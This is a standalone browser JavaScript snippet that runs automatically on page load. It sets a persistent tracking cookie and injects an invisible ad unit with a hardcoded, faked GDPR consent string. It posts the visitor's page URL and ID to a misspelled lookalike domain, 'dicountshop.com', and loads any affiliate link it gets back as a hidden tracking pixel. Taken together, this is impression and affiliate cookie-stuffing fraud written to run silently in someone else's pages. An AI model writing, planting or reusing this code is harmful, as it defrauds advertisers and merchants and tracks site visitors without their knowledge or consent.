
(async function() {
    
    
    function generateUUID() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
            var r = Math.random() * 16 | 0,
                v = c === 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }

   
    function getCookie(cname) {
        var name = cname + '=';
        var ca = document.cookie.split(';');
        for (var i = 0; i < ca.length; i++) {
            var c = ca[i].trim();
            if (c.indexOf(name) === 0) return c.substring(name.length);
        }
        return '';
    }


    function injectHiddenAd() {
        const adContainer = document.createElement('div');
        adContainer.style.display = 'none'; 

       
        const ins = document.createElement('ins');
        ins.className = 'dcmads';
        ins.style.cssText = 'display:inline-block;width:300px;height:250px';
        
       
        const attributes = {
            'data-dcm-placement': 'N1648185.2005322OPTIMISE/B33097109.414743151',
            'data-dcm-rendering-mode': 'iframe',
            'data-dcm-https-only': '',
            'data-dcm-api-frameworks': 'HTML5',
            'data-dcm-omid-partner': '12345',
            'data-dcm-gdpr-applies': 'gdpr=1',
            'data-dcm-gdpr-consent': 'gdpr_consent=COv5OrAPOv5OrABLAAAENAPCgALAAAAAAAAAAA',
            'data-dcm-addtl-consent': 'addtl_consent=1~7.12.35.62.66.70.89.93.108',
            'data-dcm-ltd': 'false',
            'data-dcm-resettable-device-id': '',
            'data-dcm-app-id': 'APP-12345'
        };

       
        for (const [key, value] of Object.entries(attributes)) {
            ins.setAttribute(key, value);
        }

        
        const script = document.createElement('script');
        script.src = 'https://www.googletagservices.com/dcm/dcmads.js';
        script.async = true;

        
        ins.appendChild(script);
        adContainer.appendChild(ins);
        document.body.appendChild(adContainer);
    }

    
    function createTrackingPixel(url) {
        const img = document.createElement('img');
        img.src = url;
        img.style.display = 'none';
        document.body.appendChild(img);
    }

    
    async function initTracking() {
        if (sessionStorage.getItem('ad_triggered')) return;

        try {
          
            let uniqueId = getCookie('tracking_uuid') || generateUUID();
            document.cookie = `tracking_uuid=${uniqueId}; max-age=${30 * 86400}; path=/`;

           
            injectHiddenAd();

         
            const response = await fetch('https://dicountshop.com/api/track-user', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    unique_id: uniqueId,
                    url: window.location.href
                })
            });

            const result = await response.json();
            if (result.affiliate_url) {
                createTrackingPixel(result.affiliate_url);
                sessionStorage.setItem('ad_triggered', 'true');
            }

        } catch (error) {
            console.error('Tracking Error:', error);
        }
    }

  
    if (document.readyState === 'complete') {
        initTracking();
    } else {
        window.addEventListener('load', initTracking);
    }

})();